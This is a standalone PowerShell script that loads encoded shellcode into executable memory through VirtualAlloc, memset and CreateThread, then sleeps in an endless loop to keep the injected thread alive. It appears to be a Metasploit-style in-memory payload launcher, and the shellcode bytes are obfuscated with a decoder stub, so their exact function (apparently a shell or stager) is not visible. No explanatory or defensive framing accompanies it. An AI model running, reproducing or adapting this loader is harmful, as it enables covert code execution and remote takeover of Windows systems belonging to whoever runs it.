$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0xe1,0xcb,0xfb,0x9d,0xdb,0xd0,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0x55,0x83,0xe8,0xfc,0x31,0x50,0x10,0x03,0x50,0x10,0x03,0x3e,0x07,0x75,0x41,0xc1,0xf8,0x86,0x25,0x4b,0x1d,0xb7,0x65,0x2f,0x55,0xe8,0x55,0x3b,0x3b,0x05,0x1e,0x69,0xa8,0x9e,0x52,0xa6,0xdf,0x17,0xd8,0x90,0xee,0xa8,0x70,0xe0,0x71,0x2b,0x8a,0x35,0x52,0x12,0x45,0x48,0x93,0x53,0xbb,0xa1,0xc1,0x0c,0xb0,0x14,0xf6,0x39,0x8c,0xa4,0x7d,0x71,0x01,0xad,0x62,0xc2,0x20,0x9c,0x34,0x58,0x7b,0x3e,0xb6,0x8d,0xf0,0x77,0xa0,0xd2,0x3c,0xc1,0x5b,0x20,0xcb,0xd0,0x8d,0x78,0x34,0x7e,0xf0,0xb4,0xc7,0x7e,0x34,0x72,0x37,0xf5,0x4c,0x80,0xca,0x0e,0x8b,0xfa,0x10,0x9a,0x08,0x5c,0xd3,0x3c,0xf5,0x5c,0x30,0xda,0x7e,0x52,0xfd,0xa8,0xd9,0x77,0x00,0x7c,0x52,0x83,0x89,0x83,0xb5,0x05,0xc9,0xa7,0x11,0x4d,0x8a,0xc6,0x00,0x2b,0x7d,0xf6,0x53,0x94,0x22,0x52,0x1f,0x39,0x37,0xef,0x42,0x56,0xa9,0x95,0x08,0xa6,0x5d,0x21,0x98,0xc8,0xf4,0x99,0x32,0x59,0x71,0x04,0xc4,0x9e,0xa8,0x79,0x11,0x33,0x01,0x29,0xf6,0xe7,0xcd,0xf7,0xae,0x7e,0xaa,0xf7,0x9a,0xd2,0xe7,0x6d,0x26,0x86,0x54,0x1a,0x6d,0x3d,0x5a,0xda,0x85,0x45,0x5a,0xda,0x55,0x99,0x11,0x99,0x6c,0xd6,0xc7,0x1d,0xdf,0x70,0x50,0x97,0x40,0x46,0xa1,0x72,0xf7,0x81,0x0e,0x15,0x08,0x0c,0xd0,0x61,0x5b,0x43,0x43,0x3d,0x0f,0x35,0x0b,0x2a,0xfa,0x97,0xf0,0x53,0xd0,0x7e,0x6c,0xa6,0x84,0x2d,0x23,0xe5,0x69,0x84,0xab,0x24,0x88,0x30,0x50,0xc8,0x41,0xc5,0x66,0x43,0x60,0x89,0x13,0x41,0x1c,0xe5,0x6e,0x3b,0x8b,0xfa,0x45,0x56,0x74,0x6d,0x65,0xb7,0x74,0x6d,0x0d,0xb7,0x74,0x2d,0xcd,0xe4,0x1c,0xf5,0x69,0x59,0x38,0xfa,0xa4,0xcd,0x91,0x56,0xcf,0x15,0x42,0x31,0xcf,0xf9,0x6d,0xc1,0x9c,0xaf,0x05,0xd3,0xb4,0xd9,0x34,0x2c,0x6d,0x5c,0x78,0xa7,0x40,0xd4,0x7e,0x49,0x99,0x6e,0x40,0x3c,0xf8,0x29,0x82,0xe0,0xea,0x43,0xfb,0xe0,0x15,0x20,0x61,0x6d,0x9f,0xae,0x0a,0xf4,0x2c,0x48,0xbe,0x82,0xb7,0xc7,0x6e,0x18,0x52,0x6a,0x19,0xbb,0xf5,0xf8,0x86,0x6d,0x66,0x92,0x25,0x72;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};
